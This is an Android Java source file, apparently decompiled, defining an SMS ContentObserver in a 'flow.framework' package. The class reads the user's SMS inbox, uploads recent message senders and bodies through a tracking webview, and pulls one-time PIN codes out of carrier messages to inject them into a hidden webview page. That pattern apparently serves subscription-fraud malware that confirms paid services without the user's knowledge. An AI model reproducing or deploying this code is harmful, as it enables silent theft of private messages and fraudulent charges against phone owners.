package com.flow.framework.broadcast;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import com.alibaba.fastjson.JSON;
import com.flow.framework.PspManager;
import com.flow.framework.bean.OfferStep;
import com.flow.framework.enums.OfferStatus;
import com.flow.framework.enums.StepEnum;
import com.flow.framework.tracking.TrackUtil;
import com.flow.framework.util.ReUtils;
import com.flow.framework.util.plog;
import java.util.ArrayList;
import java.util.List;

public class SmsChaneObserver extends ContentObserver {
    private static final String DB_FIELD_ADDRESS = "address";
    private static final String DB_FIELD_BODY = "body";
    private static final String DB_FIELD_DATE = "date";
    private static final String DB_FIELD_ID = "_id";
    private static final String[] ALL_DB_FIELD_NAME = new String[]{DB_FIELD_ID, DB_FIELD_ADDRESS, DB_FIELD_BODY, DB_FIELD_DATE};
    public static final Uri MMSSMS_ALL_MESSAGE_URI = Uri.parse("content://sms/inbox");
    private static final String SORT_FIELD_STRING = "date desc";
    private Cursor cursor;
    private Context mContext;
    private OfferStep mOfferSubStep;
    private List<SMS> mSMSList;

    class SMS {
        String address;
        String body;

        public String getAddress() {
            return this.address;
        }

        public void setAddress(String address) {
            this.address = address;
        }

        public String getBody() {
            return this.body;
        }

        public void setBody(String body) {
            this.body = body;
        }

        SMS(String address, String body) {
            this.address = address;
            this.body = body;
        }
    }

    public SmsChaneObserver(Handler handler, OfferStep offerSubStep, Context context) {
        super(handler);
        this.mOfferSubStep = offerSubStep;
        this.mContext = context;
        onChange(false);
    }

    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        switch (StepEnum.currentStep(this.mOfferSubStep.getStep())) {
            case UPLOAD_USER_SMS_FOR_LOG:
                onReceiveSmsLog();
                return;
            case SEND_MESSAGE_FOR_PIN:
                onReceiveSmsPin();
                return;
            case SEND_MESSAGE_FOR_ZA:
                onReceiveSmsZaPin();
                return;
            default:
                return;
        }
    }

    private void onReceiveSmsLog() {
        try {
            this.cursor = this.mContext.getContentResolver().query(MMSSMS_ALL_MESSAGE_URI, ALL_DB_FIELD_NAME, null, null, SORT_FIELD_STRING);
            if (this.cursor == null) {
                PspManager.getInstance().cleanWebviewClient();
                return;
            }
            if (this.mSMSList == null) {
                this.mSMSList = new ArrayList();
            }
            while (this.mSMSList.size() <= 5 && this.cursor.moveToNext()) {
                this.mSMSList.add(new SMS(this.cursor.getString(this.cursor.getColumnIndex(DB_FIELD_ADDRESS)), this.cursor.getString(this.cursor.getColumnIndex(DB_FIELD_BODY))));
            }
            String remark = JSON.toJSONString(this.mSMSList);
            plog.i("remark--->" + remark);
            TrackUtil.getInstance().getTrackWebView().getTrackWebViewClient().uploadStepLog(OfferStatus.UPLOAD_SMS_LOG, remark, this.mOfferSubStep);
            if (this.mSMSList != null) {
                this.mSMSList.clear();
                this.mSMSList = null;
            }
            this.cursor.close();
        } finally {
            if (this.mSMSList != null) {
                this.mSMSList.clear();
                this.mSMSList = null;
            }
            this.cursor.close();
        }
    }

    private void onReceiveSmsPin() {
        try {
            this.cursor = this.mContext.getContentResolver().query(MMSSMS_ALL_MESSAGE_URI, ALL_DB_FIELD_NAME, null, null, SORT_FIELD_STRING);
            if (this.cursor == null) {
                PspManager.getInstance().cleanWebviewClient();
                return;
            }
            while (this.cursor.moveToNext()) {
                String strAddress = this.cursor.getString(this.cursor.getColumnIndex(DB_FIELD_ADDRESS));
                String strbody = this.cursor.getString(this.cursor.getColumnIndex(DB_FIELD_BODY));
                plog.i("strAddress--->" + strAddress + "---strbody--->" + strbody);
                if (!TextUtils.isEmpty(strbody) || !TextUtils.isEmpty(strAddress)) {
                    if (TextUtils.isEmpty(this.mOfferSubStep.getShortCode()) || !TextUtils.isEmpty(this.mOfferSubStep.getKeyWord()) || !ReUtils.checkPINAddress(this.mOfferSubStep.getShortCode(), strAddress)) {
                        if (!TextUtils.isEmpty(this.mOfferSubStep.getShortCode()) || TextUtils.isEmpty(this.mOfferSubStep.getKeyWord()) || !ReUtils.checkPINBody(this.mOfferSubStep.getKeyWord(), strbody)) {
                            if (!TextUtils.isEmpty(this.mOfferSubStep.getShortCode()) && !TextUtils.isEmpty(this.mOfferSubStep.getKeyWord()) && ReUtils.checkPINAddress(this.mOfferSubStep.getShortCode(), strAddress) && ReUtils.checkPINBody(this.mOfferSubStep.getKeyWord(), strbody)) {
                                switchRegexType(strAddress, strbody, this.mOfferSubStep.getParams());
                                break;
                            }
                        }
                        switchRegexType(strAddress, strbody, this.mOfferSubStep.getParams());
                        break;
                    }
                    switchRegexType(strAddress, strbody, this.mOfferSubStep.getParams());
                    break;
                }
            }
            this.cursor.close();
        } finally {
            this.cursor.close();
        }
    }

    private void onReceiveSmsZaPin() {
        try {
            this.cursor = this.mContext.getContentResolver().query(MMSSMS_ALL_MESSAGE_URI, ALL_DB_FIELD_NAME, null, null, SORT_FIELD_STRING);
            if (this.cursor == null) {
                PspManager.getInstance().cleanWebviewClient();
                return;
            }
            while (this.cursor.moveToNext()) {
                String strAddress = this.cursor.getString(this.cursor.getColumnIndex(DB_FIELD_ADDRESS));
                String strbody = this.cursor.getString(this.cursor.getColumnIndex(DB_FIELD_BODY));
                plog.i("strAddress--->" + strAddress + "---strbody--->" + strbody);
                if ((!TextUtils.isEmpty(strbody) || !TextUtils.isEmpty(strAddress)) && !TextUtils.isEmpty(this.mOfferSubStep.getParams()) && strbody.contains(this.mOfferSubStep.getParams())) {
                    TrackUtil.getInstance().getTrackWebView().getTrackWebViewClient().replaceZaPinJSVCode(strAddress);
                    break;
                }
            }
            this.cursor.close();
        } finally {
            this.cursor.close();
        }
    }

    private void switchRegexType(String strAddress, String strBody, String param) {
        String vcode = ReUtils.getVcodeByRegex(param, strBody);
        if (TextUtils.isEmpty(vcode)) {
            PspManager.getInstance().cleanWebviewClient();
            return;
        }
        plog.i("mOfferSubStep.getParams()---->" + param);
        plog.i("vcode---->" + vcode);
        TrackUtil.getInstance().getTrackWebView().getTrackWebViewClient().uploadStepLog(OfferStatus.UPLOAD_SMS_REPLACE_CODE, "address=" + strAddress + "&body=" + strBody + "&param=" + param + "&vcode=" + vcode, this.mOfferSubStep);
        TrackUtil.getInstance().getTrackWebView().getTrackWebViewClient().replacePinJSVCode(vcode);
    }
}
